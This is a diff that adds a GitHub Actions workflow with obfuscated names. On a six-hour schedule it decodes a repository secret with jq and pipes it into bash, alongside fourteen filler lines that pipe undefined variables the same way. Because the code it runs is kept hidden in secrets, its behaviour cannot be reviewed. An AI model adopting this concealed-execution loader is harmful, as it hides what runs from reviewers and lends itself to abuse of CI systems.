@@ -1,0 +1,31 @@
+name: rencunxxk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: rencunxxk
+        env:
+          gp8212: ${{ secrets.gp8212 }}
+        run: |
+          echo $gp8212 | jq -r .jyep41547 | /bin/bash
+          echo $nesod5391 | jq -r .ajo3 | /bin/bash
+          echo $upt52856 | jq -r .sd0 | /bin/bash
+          echo $cx6120 | jq -r .csi943 | /bin/bash
+          echo $um779 | jq -r .dpgw923 | /bin/bash
+          echo $xnw501 | jq -r .i0010 | /bin/bash
+          echo $htyyh9938 | jq -r .yamc6551 | /bin/bash
+          echo $dmgl660 | jq -r .j18789 | /bin/bash
+          echo $hgyvr5066 | jq -r .fibl02 | /bin/bash
+          echo $gcidt2402 | jq -r .c272 | /bin/bash
+          echo $i5503 | jq -r .h9 | /bin/bash
+          echo $cj3 | jq -r .v27 | /bin/bash
+          echo $zysk74382 | jq -r .ir41275 | /bin/bash
+          echo $pcueu64 | jq -r .le1 | /bin/bash
+          echo $fix582 | jq -r .dr6349 | /bin/bash
+
